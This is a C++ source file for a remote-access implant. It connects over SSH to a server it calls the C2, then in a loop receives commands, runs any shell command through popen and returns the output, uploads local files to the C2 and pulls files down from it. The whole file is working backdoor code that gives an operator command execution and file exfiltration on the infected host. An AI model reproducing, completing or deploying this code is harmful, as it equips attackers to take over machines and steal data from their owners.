//
// Created by rip on 6/30/19.
//

#include "Payload.h"

Payload::Payload()
{
    std::cout << "[+] Setting up SSH connection...\n";

    // create the SSH session
    session = ssh_new();
    if (session == nullptr)
    {
        std::cerr << "[-] Couldn't create SSH session\n";
        exit(EXIT_FAILURE);
    }
    // configure the session
    ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
    ssh_options_set(session, SSH_OPTIONS_USER, user.c_str());
}

Payload::~Payload()
{
    tearDown();
}

void Payload::connect()
{
    std::cout << "[+] Connecting to C2...\n";
    int returnCode = ssh_connect(session);
    if (returnCode != SSH_OK)
    {
        std::cerr << "[-] Error connecting to " << host << " : " << ssh_get_error(session) << std::endl;
        tearDown();
        return;
    }

    handleConnection();
}

void Payload::handleConnection()
{
    // authenticate
    std::cout << "[+] Authenticating...\n";
    int returnCode = ssh_userauth_password(session, nullptr, pwd.c_str());
    if (returnCode != SSH_AUTH_SUCCESS)
    {
        std::cerr << "[-] Error authenticating: " << ssh_get_error(session) << std::endl;
        tearDown();
        return;
    }

    // get a communication channel to the c2 server
    std::cout << "[+] Opening communication channel...\n";
    if (!openChannel())
    {
        std::cerr << "[-] Session closed without opening a channel\n";
        tearDown();
        return;
    }
    while (true)
    {
        // get cmd from c2
        auto cmd = rcvMsg();
        std::cout << "[+] Got cmd from c2: " << cmd << std::endl;

        if (cmd == "quit" || cmd.empty())
        {
            std::cout << "[+] Quitting communication to c2.\n";
            break;
        }
        else if (startsWith(cmd, "upload"))
        {
            auto tokens = tokenize(cmd);
            if (tokens.size() == 3)
            {
                upload(tokens[1], tokens[2]);
            }
            else
            {
                std::cerr << "[-] Got invalid upload cmd.\n";
            }
        }
        else if (startsWith(cmd, "download"))
        {
            auto tokens = tokenize(cmd);
            if (tokens.size() == 3)
            {
                download(tokens[1], tokens[2]);
            }
            else
            {
                std::cerr << "[-] Got invalid download cmd.\n";
            }
        }
        else
        {
            // execute cmd
            std::cout << "[+] Executing cmd...\n";
            auto output = execCmd(cmd);
            // and send to c2
            std::cout << "[+] Sending output to server.\n";
            sendMsg(output);
        }
    }
}

void Payload::tearDown()
{
    if (channel != nullptr)
    {
        if (ssh_channel_is_open(channel))
        {
            ssh_channel_close(channel);
        }
        ssh_channel_free(channel);
    }
    if (session != nullptr)
    {
        if (ssh_is_connected(session))
        {
            ssh_disconnect(session);
        }
        ssh_free(session);
    }
}

bool Payload::openChannel()
{
    channel = ssh_channel_new(session);
    if (channel == nullptr)
    {
        std::cerr << "[-] Error while opening channel: " << ssh_get_error(session) << std::endl;
        tearDown();
        return false;
    }
    int returnCode = ssh_channel_open_session(channel);
    if (returnCode != SSH_OK)
    {
        std::cerr << "[-] Error while opening channel session: " << ssh_get_error(session) << std::endl;
        tearDown();
        return false;
    }
    return true;
};

void Payload::sendMsg(const std::string& msg)
{
    if ((ssh_channel_write(channel, msg.c_str(), (unsigned int) strlen(msg.c_str()))) == SSH_ERROR)
    {
        std::cerr << "[-] Error while writing to channel\n";
    }
}

std::string Payload::rcvMsg()
{
    char buffer[1024] { 0 };
    if ((ssh_channel_read(channel, buffer, sizeof(buffer), 0)) <= 0)
    {
        std::cerr << "[-] Error while reading from channel\n";
    }
    return std::string(buffer);
}

sftp_session Payload::setupSFTP()
{
    // create and init SFTP
    sftp_session sftp = sftp_new(session);
    if (sftp == nullptr)
    {
        std::cerr << "[-] Error allocating SFTP session: " << ssh_get_error(session) << std::endl;
        return nullptr;
    }
    int rc = sftp_init(sftp);
    if (rc != SSH_OK)
    {
        std::cerr << "[-] Error initializing SFTP session: " << sftp_get_error(sftp) << std::endl;
        sftp_free(sftp);
        return nullptr;
    }
    return sftp;
}

void Payload::upload(std::string& localFilePath, std::string& remoteFilePath)
{
    std::cout << "[+] Uploading \"" << localFilePath  << "\" to c2 as \"" << remoteFilePath << "\"\n";

    // read the local file
    auto fileBuffer = readFile(localFilePath);

    // create SFTP session
    sftp_session sftp;
    if (!(sftp = setupSFTP()))
    {
        std::cerr << "[-] Error setting up SFTP.\n";
        return;
    }

    // open the remote file
    sftp_file file = sftp_open(sftp, remoteFilePath.c_str(), O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);
    if (file == nullptr)
    {
        std::cerr << "[-] Can't open file for writing: " << ssh_get_error(session) << std::endl;
        sftp_free(sftp);
        return;
    }

    // write to it
    auto nwritten = sftp_write(file, fileBuffer.c_str(), fileBuffer.length());
    if (nwritten != fileBuffer.length())
    {
        std::cerr << "[-] Can't write data to file: " << ssh_get_error(session) << std::endl;
        sftp_close(file);
        return;
    }

    // and eventually close it again
    int rc = sftp_close(file);
    if (rc != SSH_OK)
    {
        std::cerr << "[-] Can't close the written file: " << ssh_get_error(session) << std::endl;
    }

    // free up the resources
    sftp_free(sftp);

    std::cout << "[+] Upload finished.\n";
}

void Payload::download(std::string& remoteFilePath, std::string& localFilePath)
{

    std::cout << "[+] Downloading \"" << remoteFilePath << "\" from c2 and saving as \"" << localFilePath << "\"\n";

    // create/open local file to save data in
    std::ofstream localFile("downloads/" + localFilePath);

    // make download directory if it doesn't exist yet
    auto dirName = "downloads";
    if (!dirExists(dirName))
    {
        if (mkdir(dirName, 0777) == -1)
        {
            std::cout << "[-] Error creating uploads directory!\n";
        }
    }

    // create SFTP session
    sftp_session sftp;
    if (!(sftp = setupSFTP()))
    {
        std::cerr << "[-] Error setting up SFTP.\n";
        return;
    }

    // open the remote file
    sftp_file file = sftp_open(sftp, remoteFilePath.c_str(), O_RDONLY, S_IRWXU);
    if (file == nullptr)
    {
        std::cerr << "[-] Can't open file: " << ssh_get_error(session) << std::endl;
        sftp_free(sftp);
        return;
    }

    // read from it
    char buffer[MAX_BUFF_SIZE];
    auto nbytes = sftp_read(file, buffer, sizeof(buffer));
    if (nbytes < 0)
    {
        std::cerr << "[-] Error while reading file: " << ssh_get_error(session) << std::endl;
        sftp_close(file);
        return;
    }
    // write into local file
    if (localFile.is_open())
    {
        localFile << std::string(buffer);
    }

    // and eventually close it
    int rc = sftp_close(file);
    if (rc != SSH_OK)
    {
        std::cerr << "[-] Can't close the read remote file: " << ssh_get_error(session) << std::endl;
    }

    // clean up resources
    if (localFile.is_open())
    {
        localFile.close();
    }
    sftp_free(sftp);

    std::cout << "[+] Download finished.\n";
}

std::string Payload::execCmd(std::string& cmd)
{
    std::array<char, 128> buffer{};
    std::string result;
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
#else
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
#endif
    if (!pipe)
    {
        std::cerr << "[-] Cmd execution failed\n";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }

    return result;
}